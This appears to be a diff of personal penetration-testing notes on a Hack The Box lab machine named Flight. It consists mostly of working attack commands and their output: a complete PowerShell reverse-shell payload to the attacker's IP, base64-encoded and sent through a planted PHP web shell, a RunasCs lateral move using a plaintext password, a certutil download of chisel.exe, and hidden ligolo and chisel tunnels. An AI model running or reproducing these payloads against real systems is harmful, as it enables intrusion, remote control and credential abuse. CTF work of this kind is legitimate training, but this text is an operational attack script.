@@ -396,6 +396,186 @@ chisel tunneling to the website/port is not working.
 will come back.
 
 
+starting again....
+
+┌──(root㉿kali)-[/home/kali]
+└─# # Put the one-line payload in single-quotes
+payload='$client = New-Object System.Net.Sockets.TCPClient('"'"'10.10.14.18'"'"',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + '\''PS '\'' + (pwd).Path + '\''> '\'';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+# Make Base64 UTF-16LE for PowerShell -EncodedCommand
+echo -n "$payload" | iconv -f utf-8 -t utf-16le | base64 -w0 > payload.b64
+                                                                                                                    
+┌──(root㉿kali)-[/home/kali]
+└─# B64=$(cat payload.b64)
+curl -G --data-urlencode "cmd=powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand $B64" "http://flight.htb/shell.php"
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 4444                        
+listening on [any] 4444 ...
+connect to [10.10.14.18] from (UNKNOWN) [10.10.11.187] 49739
+whoami
+flight\svc_apache
+PS C:\xampp\htdocs\flight.htb> 
+
+PS C:\Users\Public> # stay in the folder where RunasCs.exe is (e.g. C:\Users\Public)
+Set-Location C:\Users\Public
+
+# build payload as a literal here-string (no variables expanded inside)
+$payload = @'
+$client = New-Object System.Net.Sockets.TCPClient("10.10.14.18",5555);
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535 | % {0};
+while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0) {
+  $data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);
+  $sendback = (iex $data 2>&1 | Out-String);
+  $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
+  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+  $stream.Write($sendbyte,0,$sendbyte.Length);
+  $stream.Flush();
+};
+$client.Close();
+'@
+
+# encode to UTF-16LE base64 for PowerShell -EncodedCommand
+$b64 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payload))
+
+# run RunasCs.exe as c.bum with the encoded command (replace password if different)
+.\RunasCs.exe c.bum Tikkycoll_431012284 -l 2 "powershell -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $b64"PS C:\Users\Public> PS C:\Users\Public> 
+[*] Warning: The logon for user 'c.bum' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.
+[-] RunasCsException: CreateProcessWithLogonW logon type 2 failed with error code: The parameter is incorrect
+PS C:\Users\Public> 
+PS C:\Users\Public> # (assumes $payload  $andb64 already created)
+$cmd = "powershell -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $b64"
+
+# now call RunasCs with the already-built command string
+.\RunasCs.exe c.bum Tikkycoll_431012284 -l 2 $cmdPS C:\Users\Public> PS C:\Users\Public> 
+[*] Warning: The logon for user 'c.bum' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.
+[-] RunasCsException: CreateProcessWithLogonW logon type 2 failed with error code: The parameter is incorrect
+PS C:\Users\Public> 
+PS C:\Users\Public> .\RunasCs.exe c.bum Tikkycoll_431012284 --bypass-uac --logon-type 8 $cmd
+[-] RunasCsException: [!] Failed to set the token's Integrity Level: High
+PS C:\Users\Public> # write the script locally (one line or here-string)
+Set-Content -Path C:\Users\Public\payload.ps1 -Value $payload -Encoding UTF8
+
+# run RunasCs to execute the file as c.bum (use -l 2 which worked for you earlier)
+.\RunasCs.exe c.bum Tikkycoll_431012284 -l 2 "powershell -NoProfile -ExecutionPolicy Bypass -File C:\Users\Public\payload.ps1"PS C:\Users\Public> PS C:\Users\Public> 
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 5555                        
+listening on [any] 5555 ...
+connect to [10.10.14.18] from (UNKNOWN) [10.10.11.187] 49758
+whoami
+flight\c.bum
+PS C:\Windows\system32> 
+
+
+# stop any existing agent
+Get-Process -Name agent -ErrorAction SilentlyContinue | Stop-Process -Force
+
+# start the agent (no -bind). Use Start-Process so it detaches;
+# this lets it persist while you interact with the proxy.
+Start-Process -FilePath "C:\Users\Public\agent.exe" -ArgumentList "-connect 10.10.14.18:11601 -ignore-cert -retry -v" -WindowStyle Hidden
+
+# optional: tail any logfile if you redirected earlier
+Get-Content C:\Users\Public\agent.out -Tail 100 -ErrorAction SilentlyContinue
+
+┌──(root㉿kali)-[/home/kali]
+└─# ligolo-proxy -selfcert           
+INFO[0000] Loading configuration file ligolo-ng.yaml    
+WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
+INFO[0000] Listening on 0.0.0.0:11601                   
+    __    _             __                       
+   / /   (_)___ _____  / /___        ____  ____ _
+  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
+ / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
+/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
+        /____/                          /____/   
+
+  Made in France ♥            by @Nicocha30!
+  Version: dev
+
+ligolo-ng » INFO[0699] Agent joined.                                 id=005056b020c4 name="flight\\C.Bum@g0" remote="10.10.11.187:49861"
+
+ligolo-ng » session
+? Specify a session : 1 - flight\C.Bum@g0 - 10.10.11.187:49861 - 005056b020c4
+[Agent : flight\C.Bum@g0] » help listener_add
+
+Listen on the agent and redirect connections to the desired address
+
+Usage:
+======
+  listener_add --addr [agent_listening_address:port] --to [local_listening_address:port] --tcp/--udp
+
+Flags:
+======
+      --addr string    The agent listening address:port
+  -h, --help           display help
+      --tcp            Use TCP listener
+      --to   string    Where to redirect connections
+      --udp            Use UDP listener
+
+[Agent : flight\C.Bum@g0] »  
+[Agent : flight\C.Bum@g0] » listener_add --addr 127.0.0.1:11602 --to 127.0.0.1:8000 --tcp
+INFO[1096] Listener 0 created on remote agent!          
+[Agent : flight\C.Bum@g0] »
+
+# TUNNEL DEBUG SESSION (ligolo-ng)
+# Problem: listener shows Online but proxy never creates host socket on Kali
+
+ligolo-ng » start
+error: unable to start tunnel: unable to open tun interface 'ligolo' (tun.New no such device)
+
+# Created TUN interface manually:
+ip tuntap add user root mode tun ligolo
+ip link set ligolo up
+ip addr add 172.16.200.1/24 dev ligolo
+
+[Agent : flight\C.Bum@g0] » start
+INFO[0100] Starting tunnel to flight\C.Bum@g0 (005056b020c4) 
+
+# Tried multiple listener configs, all show Online but no host socket:
+listener_add --addr 127.0.0.1:11666 --to 172.16.200.1:8000 --tcp  # bind error (port in use)
+listener_add --addr 127.0.0.1:11777 --to 172.16.200.1:8000 --tcp  # Online but no socket
+listener_add --addr 127.0.0.1:11777 --to 0.0.0.0:8000 --tcp       # Online but no socket
+
+# Current state:
+# - Agent acceptor exists on Windows 127.0.0.1:11777
+# - Proxy listener shows Online: 127.0.0.1:11777 -> 0.0.0.0:8000
+# - But ss shows no :8000 listener on Kali
+# - curl 172.16.200.1:8000 = Connection refused
+
+# Next: capture proxy bind logs or use strace to see why proxy doesn't open host socket  
+
+
+
+
+so we try again with chisel
+PS C:\Users\Public> certutil -f -urlcache "http://10.10.14.18/chisel.exe" chisel.exe
+****  Online  ****
+CertUtil: -URLCache command completed successfully.
+PS C:\Users\Public> # interactive run (shows logs)
+C:\Users\Public\chisel.exe client 10.10.14.18:9000 R:8000:127.0.0.1:8000
+PS C:\Users\Public> 
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# chisel server -p 9000 --reverse
+2025/09/29 20:17:53 server: Reverse tunnelling enabled
+2025/09/29 20:17:53 server: Fingerprint j5X8AIckz6ujhftgmpKAV9BmqUyBjWwH/U2GFRGfCvk=
+2025/09/29 20:17:53 server: Listening on http://0.0.0.0:9000
+2025/09/29 20:18:13 server: session#1: Client version (1.10.1) differs from server version (1.10.1-0kali1)
+2025/09/29 20:18:13 server: session#1: tun: proxy#R:8000=>8000: Listening
+
+
+
+
+
+
+
+
+
+
 
 
 
